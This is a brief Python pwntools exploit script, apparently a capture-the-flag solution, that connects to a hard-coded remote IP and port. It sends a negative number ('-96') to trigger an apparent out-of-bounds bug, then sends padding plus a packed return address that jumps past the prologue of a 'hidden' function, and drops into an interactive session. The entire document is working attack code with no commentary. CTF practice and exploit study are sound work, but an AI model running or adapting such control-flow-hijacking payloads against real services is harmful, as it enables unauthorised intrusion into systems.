from pwn import *
rhp = {'host': '133.242.68.223', 'port':35285}
hidden = 0x4007bd
hidden_skip_prologue = 0x4007c1

conn = remote(rhp['host'], rhp['port'])

log.info(conn.recv()) 
payload = "-96"
print(payload)
conn.sendline(payload)
log.info(conn.recv()) 
payload = b"A" * 8 + p64(hidden_skip_prologue)
print(payload)
conn.sendline(payload)

conn.interactive()